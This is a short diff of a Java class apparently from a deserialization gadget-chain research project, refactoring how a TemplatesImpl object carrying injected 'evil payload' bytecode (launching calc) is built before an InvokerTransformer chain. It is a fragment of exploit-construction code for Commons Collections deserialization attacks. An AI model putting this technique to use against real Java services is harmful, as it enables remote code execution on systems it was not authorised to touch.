@@ -12,12 +12,7 @@ import java.util.Map;
 
 public class CC4CCGadgets6 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates ,"_name" ,"xxx");
-        Utils.setValue(templates ,"_class" ,null);
-        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
-        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         Transformer transformer = new InvokerTransformer(
                 "useServicesMechnism" ,
